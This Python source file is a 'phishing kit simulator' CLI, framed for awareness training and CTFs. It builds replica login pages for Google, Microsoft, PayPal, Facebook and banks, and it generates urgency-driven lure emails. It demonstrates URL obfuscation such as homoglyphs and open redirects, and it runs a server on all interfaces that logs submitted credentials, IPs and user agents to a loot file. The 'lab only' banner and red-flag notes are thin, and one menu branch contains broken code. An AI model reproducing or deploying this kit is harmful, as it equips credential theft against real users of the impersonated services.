"""
PhishGuard CLI — phishing_kit.py
==================================
Phishing Kit Simulator — For security research, CTF, and awareness training only.

This module demonstrates HOW phishing kits are built so defenders can:
  • Recognise them in the wild
  • Build better detection rules
  • Understand attacker infrastructure

   DO NOT deploy generated pages against real users.
    Use only in isolated lab / CTF environments.

    
    Authors are not responsible for misuse.
"""

import os
import time
import json
import base64
import hashlib
import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from pathlib import Path

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich.syntax import Syntax
from rich.columns import Columns
from rich import box
# from streamlit import html

console = Console()

#  CONSTANTS

LOOT_FILE   = Path("phishkit_loot.json")
LOG_FILE    = Path("phishkit_log.txt")
PAGES_DIR   = Path("phishkit_pages")
KIT_BANNER  = "[bold red]⚠  PHISHGUARD — PHISHING KIT SIMULATOR  ⚠[/bold red]"

BRAND_TEMPLATES = {
    "1": "Google",
    "2": "Microsoft / Office 365",
    "3": "PayPal",
    "4": "Facebook",
    "5": "Generic Corporate SSO",
    "6": "Bank (Generic)",
    "7": "Custom",
}

#  HTML PAGE GENERATOR

PAGE_STYLES = {
    "Google": {
        "bg": "#ffffff",
        "accent": "#4285F4",
        "btn": "#4285F4",
        "logo": " Google",
        "title": "Sign in – Google Accounts",
        "field1_label": "Email or phone",
        "field1_name": "email",
        "field2_label": "Password",
        "field2_name": "password",
        "cta": "Next",
        "subtext": "Use your Google Account",
    },
    "Microsoft / Office 365": {
        "bg": "#ffffff",
        "accent": "#0078D4",
        "btn": "#0078D4",
        "logo": " Microsoft",
        "title": "Sign in to your account",
        "field1_label": "Email, phone, or Skype",
        "field1_name": "username",
        "field2_label": "Password",
        "field2_name": "password",
        "cta": "Sign in",
        "subtext": "Microsoft account",
    },
    "PayPal": {
        "bg": "#f5f7fa",
        "accent": "#003087",
        "btn": "#0070BA",
        "logo": " PayPal",
        "title": "Log in to PayPal",
        "field1_label": "Email address",
        "field1_name": "email",
        "field2_label": "Password",
        "field2_name": "password",
        "cta": "Log In",
        "subtext": "The safer, easier way to pay",
    },
    "Facebook": {
        "bg": "#f0f2f5",
        "accent": "#1877F2",
        "btn": "#1877F2",
        "logo": " Facebook",
        "title": "Facebook – log in or sign up",
        "field1_label": "Email or phone number",
        "field1_name": "email",
        "field2_label": "Password",
        "field2_name": "password",
        "cta": "Log In",
        "subtext": "Connect with friends and the world around you.",
    },
    "Generic Corporate SSO": {
        "bg": "#1e2a3a",
        "accent": "#00c8ff",
        "btn": "#00c8ff",
        "logo": " Corporate Portal",
        "title": "Employee Sign-In",
        "field1_label": "Corporate Email",
        "field1_name": "email",
        "field2_label": "Password",
        "field2_name": "password",
        "cta": "Sign In",
        "subtext": "Authorised users only",
    },
    "Bank (Generic)": {
        "bg": "#003366",
        "accent": "#ffcc00",
        "btn": "#ffcc00",
        "logo": " SecureBank",
        "title": "Online Banking Login",
        "field1_label": "Account Number / Username",
        "field1_name": "username",
        "field2_label": "PIN / Password",
        "field2_name": "password",
        "cta": "Secure Login",
        "subtext": "256-bit encrypted connection",
    },
}


def _build_html_page(brand: str, redirect_url: str, collector_path: str) -> str:
    """
    Generate a replica login page HTML.
    collector_path = the POST endpoint that logs credentials.
    redirect_url   = where the victim is sent after submitting.
    """
    style = PAGE_STYLES.get(brand, PAGE_STYLES["Generic Corporate SSO"])
    is_dark = brand in ("Generic Corporate SSO", "Bank (Generic)")
    text_color = "#ffffff" if is_dark else "#202124"
    input_bg = "#2c3e50" if is_dark else "#ffffff"
    input_text = "#ffffff" if is_dark else "#000000"
    input_border = style["accent"]

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>{style['title']}</title>
  <style>
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{
      background: {style['bg']};
      font-family: 'Segoe UI', Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: {text_color};
    }}
    .card {{
      background: {'rgba(255,255,255,0.05)' if is_dark else '#ffffff'};
      border: {'1px solid rgba(255,255,255,0.1)' if is_dark else '1px solid #dadce0'};
      border-radius: 10px;
      padding: 48px 40px 36px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 2px 24px rgba(0,0,0,0.15);
    }}
    .logo {{
      font-size: 28px;
      font-weight: 700;
      color: {style['accent']};
      text-align: center;
      margin-bottom: 8px;
    }}
    .subtext {{
      text-align: center;
      font-size: 14px;
      opacity: 0.7;
      margin-bottom: 28px;
    }}
    .form-group {{
      margin-bottom: 20px;
    }}
    label {{
      display: block;
      font-size: 13px;
      font-weight: 600;
      margin-bottom: 6px;
      opacity: 0.85;
    }}
    input[type="text"],
    input[type="email"],
    input[type="password"] {{
      width: 100%;
      padding: 12px 14px;
      background: {input_bg};
      color: {input_text};
      border: 1.5px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
      outline: none;
      transition: border-color 0.2s;
    }}
    input:focus {{
      border-color: {input_border};
    }}
    .btn {{
      width: 100%;
      padding: 12px;
      background: {style['btn']};
      color: {'#1a1a1a' if brand == 'Bank (Generic)' else '#ffffff'};
      border: none;
      border-radius: 6px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 8px;
      letter-spacing: 0.5px;
    }}
    .btn:hover {{
      opacity: 0.9;
    }}
    .footer-links {{
      text-align: center;
      margin-top: 20px;
      font-size: 12px;
      opacity: 0.5;
    }}
    .footer-links a {{
      color: {style['accent']};
      text-decoration: none;
      margin: 0 8px;
    }}
    /* Red banner to mark this as a demo */
    .demo-banner {{
      background: #c0392b;
      color: #fff;
      text-align: center;
      font-size: 11px;
      font-weight: bold;
      padding: 6px;
      border-radius: 6px 6px 0 0;
      margin: -48px -40px 30px;
      letter-spacing: 1px;
    }}
  </style>
</head>
<body>
  <div class="card">
    <div class="demo-banner">⚠ PHISHGUARD DEMO — LAB USE ONLY ⚠</div>
    <div class="logo">{style['logo']}</div>
    <p class="subtext">{style['subtext']}</p>
    <form action="{collector_path}" method="POST">
      <input type="hidden" name="_redirect" value="{redirect_url}" />
      <input type="hidden" name="_ts" value="__TS__" />
      <div class="form-group">
        <label for="f1">{style['field1_label']}</label>
        <input type="text" id="f1" name="{style['field1_name']}"
               placeholder="{style['field1_label']}" autocomplete="off" />
      </div>
      <div class="form-group">
        <label for="f2">{style['field2_label']}</label>
        <input type="password" id="f2" name="{style['field2_name']}"
               placeholder="{style['field2_label']}" autocomplete="off" />
      </div>
      <button class="btn" type="submit">{style['cta']}</button>
    </form>
    <div class="footer-links">
      <a href="#">Forgot password?</a> &bull; <a href="#">Help</a> &bull; <a href="#">Privacy</a>
    </div>
  </div>
  <script>
    // Inject timestamp into hidden field
    document.querySelector('input[name="_ts"]').value = new Date().toISOString();
  </script>
</body>
</html>"""
    return html


#  LURE EMAIL GENERATOR

LURE_TEMPLATES = {
    "Credential Reset": {
        "subject": "Action Required: Your {brand} password will expire in 24 hours",
        "body": (
            "Dear User,\n\n"
            "Our security systems have detected that your {brand} account password "
            "is due to expire within the next 24 hours.\n\n"
            "To avoid losing access to your account, please verify your identity "
            "and set a new password immediately:\n\n"
            "    👉 {link}\n\n"
            "If you do not act within 24 hours, your account will be temporarily "
            "suspended for security reasons.\n\n"
            "Regards,\n{brand} Security Team\n\n"
            "---\n"
            "This is an automated message. Please do not reply."
        ),
        "red_flags": [
            "Artificial urgency ('24 hours', 'immediately')",
            "Threat of account suspension",
            "Unsolicited password reset",
            "Generic greeting 'Dear User'",
            "Link does not go to official domain",
        ],
    },
    "Suspicious Login Alert": {
        "subject": "⚠ New sign-in to your {brand} account from an unrecognised device",
        "body": (
            "Hello,\n\n"
            "We noticed a new sign-in to your {brand} account from:\n\n"
            "  Device:   Windows 10\n"
            "  Location: Moscow, Russia\n"
            "  Time:     {time} UTC\n\n"
            "If this was you, you can ignore this email.\n\n"
            "If this was NOT you, your account may be compromised. "
            "Secure it now:\n\n"
            "    👉 {link}\n\n"
            "Act quickly to protect your account.\n\n"
            "{brand} Support"
        ),
        "red_flags": [
            "Fear trigger ('Moscow, Russia' — chosen to alarm)",
            "Binary choice: ignore OR click — no middle ground",
            "Fake specificity (device, location, time) to appear legitimate",
            "Urgency pressure: 'Act quickly'",
        ],
    },
    "Package / Delivery": {
        "subject": "Your {brand} package could not be delivered — action required",
        "body": (
            "Dear Customer,\n\n"
            "We attempted to deliver your parcel today but were unable to "
            "complete the delivery.\n\n"
            "To reschedule your delivery and avoid the parcel being returned, "
            "please confirm your delivery address and pay a small redelivery "
            "fee of £1.99:\n\n"
            "    👉 {link}\n\n"
            "This link expires in 48 hours.\n\n"
            "Reference: PKG-{ref}\n\n"
            "{brand} Delivery Services"
        ),
        "red_flags": [
            "Payment for 'small fee' — card harvesting technique",
            "Time pressure ('expires in 48 hours')",
            "Fake tracking reference adds false legitimacy",
            "Generic 'Dear Customer'",
        ],
    },
    "Invoice / Finance": {
        "subject": "Invoice #{ref} from {brand} — Payment due",
        "body": (
            "Dear Accounts Team,\n\n"
            "Please find attached Invoice #{ref} for services rendered.\n\n"
            "Amount Due: $4,850.00\n"
            "Due Date:   {date}\n\n"
            "To review and process this invoice, please log in to our "
            "secure billing portal:\n\n"
            "    👉 {link}\n\n"
            "If you have any questions, please do not reply to this email — "
            "contact billing@{brand_lower}-invoices.net\n\n"
            "Thank you for your business.\n\n"
            "{brand} Billing Department"
        ),
        "red_flags": [
            "Unexpected invoice — business email compromise (BEC) pattern",
            "Contact address on a lookalike domain",
            "Targets accounts/finance staff who process payments",
            "Instruction not to reply (prevents verification)",
        ],
    },
}


def generate_lure_email(brand: str, link: str, template_name: str) -> dict:
    """Return a rendered phishing lure email with red flag annotations."""
    template = LURE_TEMPLATES[template_name]
    now = datetime.datetime.utcnow()
    ref = hashlib.md5(f"{brand}{now}".encode()).hexdigest()[:8].upper()

    subject = template["subject"].format(brand=brand)
    body = template["body"].format(
        brand=brand,
        brand_lower=brand.lower().replace(" ", ""),
        link=link,
        time=now.strftime("%H:%M"),
        date=(now + datetime.timedelta(days=7)).strftime("%d %b %Y"),
        ref=ref,
    )
    return {
        "from":     f"noreply@{brand.lower().replace(' ','')}-security.com",
        "subject":  subject,
        "body":     body,
        "red_flags": template["red_flags"],
    }


#  OBFUSCATION TECHNIQUES DEMONSTRATOR

def demonstrate_obfuscation(url: str):
    """Show various URL obfuscation techniques attackers use."""
    parsed = urlparse(url if "://" in url else "https://" + url)
    domain = parsed.netloc or parsed.path.split("/")[0]
    path   = parsed.path if parsed.netloc else ""

    techniques = []

    # 1. Base64 encode the whole URL
    b64 = base64.urlsafe_b64encode(url.encode()).decode()
    techniques.append({
        "name":    "Base64 encoding",
        "result":  f"https://decode-b64.run/?q={b64}",
        "purpose": "Hides the actual URL from email scanners and human inspection",
    })

    # 2. URL percent-encoding
    encoded = "https://" + "".join(
        f"%{ord(c):02X}" if c not in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_~" else c
        for c in domain
    ) + path
    techniques.append({
        "name":    "Percent-encoding (URL encoding)",
        "result":  encoded,
        "purpose": "Domain looks scrambled but browsers decode it transparently",
    })

    # 3. Open redirect abuse
    techniques.append({
        "name":    "Open redirect (Google)",
        "result":  f"https://www.google.com/url?sa=t&url={url}",
        "purpose": "Link passes as google.com; victim lands on attacker site",
    })

    # 4. Shortener simulation
    short_hash = hashlib.md5(url.encode()).hexdigest()[:6]
    techniques.append({
        "name":    "URL shortener simulation",
        "result":  f"https://bit.ly/{short_hash}",
        "purpose": "Completely hides destination; bypasses reputation filters",
    })

    # 5. Data URI (for email HTML)
    data_uri = f"data:text/html;base64,{base64.b64encode(b'<html><body>Redirecting...</body></html>').decode()}"
    techniques.append({
        "name":    "Data URI redirect",
        "result":  data_uri[:80] + "...",
        "purpose": "Embedded HTML in the URL itself — no domain to block",
    })

    # 6. Subdomain spoofing
    techniques.append({
        "name":    "Subdomain spoofing",
        "result":  f"https://{domain}.attacker-server.com{path}",
        "purpose": "Victim sees legitimate brand at the start; real domain is attacker-server.com",
    })

    # 7. Homoglyph (Cyrillic substitute for 'a' and 'e')
    homoglyph_domain = domain.replace("a", "а").replace("e", "е")  # Cyrillic а, е
    techniques.append({
        "name":    "Homoglyph / IDN homograph",
        "result":  f"https://{homoglyph_domain}{path}",
        "purpose": "Visually identical to original; different Unicode code points",
    })

    return techniques


#  LOCAL CREDENTIAL COLLECTOR (lab/demo server)

COLLECTED_CREDS = []   # in-memory store for current session


class CredentialCollector(BaseHTTPRequestHandler):
    """
    Simple HTTP handler that:
    - Serves the phishing page on GET /
    - Logs POST credentials locally and redirects victim
    """

    page_html = ""
    redirect_to = "https://accounts.google.com"  # default redirect

    def log_message(self, format, *args):
        # Suppress default HTTP log use our own
        pass

    def do_GET(self):
        if self.path in ("/", "/login", "/signin"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(CredentialCollector.page_html.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        params = parse_qs(body)

        cred = {
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "ip":        self.client_address[0],
            "user_agent": self.headers.get("User-Agent", ""),
            "data":      {k: v[0] for k, v in params.items()
                          if k not in ("_redirect", "_ts")},
        }

        COLLECTED_CREDS.append(cred)
        _log_credential(cred)
        console.print(
            f"\n[bold green] Credential captured![/bold green] "
            f"IP: [cyan]{cred['ip']}[/cyan] | "
            f"Data: [yellow]{cred['data']}[/yellow]"
        )

        redirect = params.get("_redirect", [CredentialCollector.redirect_to])[0]
        self.send_response(302)
        self.send_header("Location", redirect)
        self.end_headers()


def _log_credential(cred: dict):
    """Append credential to JSON loot file and text log."""
    # JSON loot
    existing = []
    if LOOT_FILE.exists():
        try:
            existing = json.loads(LOOT_FILE.read_text())
        except json.JSONDecodeError:
            pass
    existing.append(cred)
    LOOT_FILE.write_text(json.dumps(existing, indent=2))

    # Text log
    with open(LOG_FILE, "a") as f:
        f.write(f"[{cred['timestamp']}] IP={cred['ip']} DATA={cred['data']}\n")


def start_collector_server(page_html: str, port: int, redirect_to: str):
    """Start the local HTTP credential collector."""
    CredentialCollector.page_html = page_html
    CredentialCollector.redirect_to = redirect_to
    server = HTTPServer(("0.0.0.0", port), CredentialCollector)
    console.print(
        f"\n[bold green]✔ Server running:[/bold green] "
        f"[underline]http://localhost:{port}[/underline]\n"
        f"  [dim]Ctrl+C to stop[/dim]\n"
    )
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Server stopped.[/bold yellow]")
    finally:
        server.server_close()


#  LOOT VIEWER

def view_loot():
    """Display credentials collected in the current lab session."""
    if not LOOT_FILE.exists():
        console.print("[yellow]No loot file found. Run the collector first.[/yellow]")
        return

    try:
        data = json.loads(LOOT_FILE.read_text())
    except json.JSONDecodeError:
        console.print("[red]Loot file is corrupted.[/red]")
        return

    if not data:
        console.print("[yellow]No credentials captured yet.[/yellow]")
        return

    table = Table(title=f"Captured Credentials ({len(data)} entries)",
                  box=box.ROUNDED, border_style="green")
    table.add_column("#", style="dim", width=4)
    table.add_column("Timestamp", style="cyan")
    table.add_column("IP", style="magenta")
    table.add_column("Captured Data", style="yellow")

    for i, entry in enumerate(data, 1):
        data_str = "  |  ".join(f"{k}: {v}" for k, v in entry.get("data", {}).items())
        table.add_row(str(i), entry["timestamp"], entry["ip"], data_str)

    console.print(table)


#  MENU HELPERS

def _clear():
    os.system("clear" if os.name != "nt" else "cls")


def _header(title: str):
    console.print()
    console.print(Panel(f"[bold red]{title}[/bold red]", border_style="red", padding=(0, 2)))


def _choose_brand() -> str:
    console.print("\n[bold]Select brand template:[/bold]")
    for k, v in BRAND_TEMPLATES.items():
        if k != "7":
            console.print(f"  [cyan]{k}.[/cyan] {v}")
    console.print(f"  [cyan]7.[/cyan] Custom")

    choice = Prompt.ask("Choice", choices=list(BRAND_TEMPLATES.keys()), default="1")

    if choice == "7":
        brand = Prompt.ask("Enter custom brand name")
        # Build a minimal custom style
        PAGE_STYLES[brand] = {
            "bg": "#1e1e2e", "accent": "#cba6f7", "btn": "#cba6f7",
            "logo": f" {brand}", "title": f"{brand} — Sign In",
            "field1_label": "Username / Email", "field1_name": "username",
            "field2_label": "Password", "field2_name": "password",
            "cta": "Login", "subtext": f"Secure access to {brand}",
        }
        return brand
    return BRAND_TEMPLATES[choice]


#  MAIN PHISHING KIT MENU

def run_phishing_kit():
    """
    Main entry point — called from main.py menu option 3.
    """
    while True:
        _clear()
        console.print(Panel(
            f"{KIT_BANNER}\n"
            "[dim]Security research & CTF tool — lab environments only[/dim]",
            border_style="red", padding=(1, 4),
        ))

        console.print("\n  [bold]Select a module:[/bold]\n")
        console.print("  [bold red]1.[/bold red]   Phishing Page Builder  (generate replica login page)")
        console.print("  [bold red]2.[/bold red]   Lure Email Generator   (craft phishing email templates)")
        console.print("  [bold red]3.[/bold red]   Obfuscation Showcase   (URL hiding techniques)")
        console.print("  [bold red]4.[/bold red]   Start Credential Collector (local lab server)")
        console.print("  [bold red]5.[/bold red]   View Captured Loot     (review collected credentials)")
        console.print("  [bold red]0.[/bold red] ←   Back to main menu\n")

        choice = Prompt.ask("[bold]Choice[/bold]", choices=["0","1","2","3","4","5"])

        # 1. Page Builder
        if choice == "1":
            _clear()
            _header("Phishing Page Builder")

            brand = _choose_brand()
            redirect_url = Prompt.ask(
                "\nRedirect URL after form submit",
                default=f"https://{'accounts.google.com' if brand == 'Google' else 'login.microsoftonline.com' if 'Microsoft' in brand else 'www.paypal.com'}"
            )
            collector_path = Prompt.ask("POST collector endpoint", default="/collect")
            port = Prompt.ask("Port for preview server", default="8080")

            html = _build_html_page(brand, redirect_url, collector_path)

            # Save to disk
            PAGES_DIR.mkdir(exist_ok=True)
            filename = PAGES_DIR / f"{brand.lower().replace(' ','_').replace('/','')}_login.html"
            filename.write_text(html, encoding="utf-8")

            console.print(f"\n[bold green]✔ Page generated:[/bold green] [cyan]{filename}[/cyan]")
            console.print(f"  Size: {len(html):,} bytes\n")

            # Show a snippet
            snippet = "\n".join(html.splitlines()[:30])
            console.print(Syntax(snippet + "\n...", "html", theme="monokai", line_numbers=True))

            # Offer to preview
            if Confirm.ask("\nStart local preview server?"):
                start_collector_server(html, int(port), redirect_url)

        # 2. Lure Email Generator
        elif choice == "2":
            _clear()
            _header("Lure Email Generator")

            brand = Prompt.ask("Brand to impersonate", default="Google")
            link  = Prompt.ask("Phishing link to embed", default="http://localhost:8080")

            console.print("\n[bold]Choose lure template:[/bold]")
            templates = list(LURE_TEMPLATES.keys())
            for i, t in enumerate(templates, 1):
                console.print(f"  [cyan]{i}.[/cyan] {t}")

            t_choice = Prompt.ask("Template", choices=[str(i) for i in range(1, len(templates)+1)], default="1")
            template_name = templates[int(t_choice) - 1]

            email = generate_lure_email(brand, link, template_name)

            console.print()
            console.print(Panel(
                f"[bold]From:[/bold]    [red]{email['from']}[/red]\n"
                f"[bold]Subject:[/bold] [yellow]{email['subject']}[/yellow]\n\n"
                f"{email['body']}",
                title="[bold] Generated Phishing Email[/bold]",
                border_style="yellow",
            ))

            console.print("\n[bold red]🚩 Red Flags in this email:[/bold red]")
            for flag in email["red_flags"]:
                console.print(f"  • {flag}")

            input("\n  Press Enter to continue...")

        # 3. Obfuscation Showcase
        elif choice == "3":
            _clear()
            _header("URL Obfuscation Techniques")

            url = Prompt.ask("Enter base phishing URL to obfuscate", default="http://malicious-login.example.com/steal")
            techniques = demonstrate_obfuscation(url)

            table = Table(title="Obfuscation Techniques", box=box.ROUNDED, border_style="red")
            table.add_column("#",         style="dim",    width=3)
            table.add_column("Technique", style="bold",   width=28)
            table.add_column("Obfuscated URL",             width=50)
            table.add_column("Purpose",                    width=40)

            for i, t in enumerate(techniques, 1):
                table.add_row(str(i), t["name"], t["result"], t["purpose"])

            console.print(table)
            input("\n  Press Enter to continue...")

        # 4. Start Collector
        elif choice == "4":
            _clear()
            _header("Credential Collector Server")

            if not PAGES_DIR.exists() or not list(PAGES_DIR.glob("*.html")):
                console.print("[yellow]No pages found. Generate a page first (option 1).[/yellow]")
                input("\n  Press Enter...")
                continue

            pages = list(PAGES_DIR.glob("*.html"))
            console.print("\n[bold]Available pages:[/bold]")
            for i, p in enumerate(pages, 1):
                console.print(f"  [cyan]{i}.[/cyan] {p.name}")

            p_choice = Prompt.ask("Select page", choices=[str(i) for i in range(1, len(pages)+1)], default="1")
            selected_page = pages[int(p_choice) - 1]
            page_html = selected_page.read_text(encoding="utf-8")

            redirect_url = Prompt.ask("Redirect after capture", default="https://www.google.com")
            srv_port = int(Prompt.ask("Port", default="8080"))

            start_collector_server(page_html, srv_port, redirect_url)

            console.print(f"\n[bold green]✔ Serving:[/bold green] {selected_page.name}")
            console.print(f"[bold green]✔ Loot file:[/bold green] [cyan]{LOOT_FILE}[/cyan]")
            start_collector_server(html, port, redirect_url)

        # 5. View Loot
        elif choice == "5":
            _clear()
            _header("Captured Credentials")
            view_loot()
            input("\n  Press Enter to continue...")

        elif choice == "0":
            break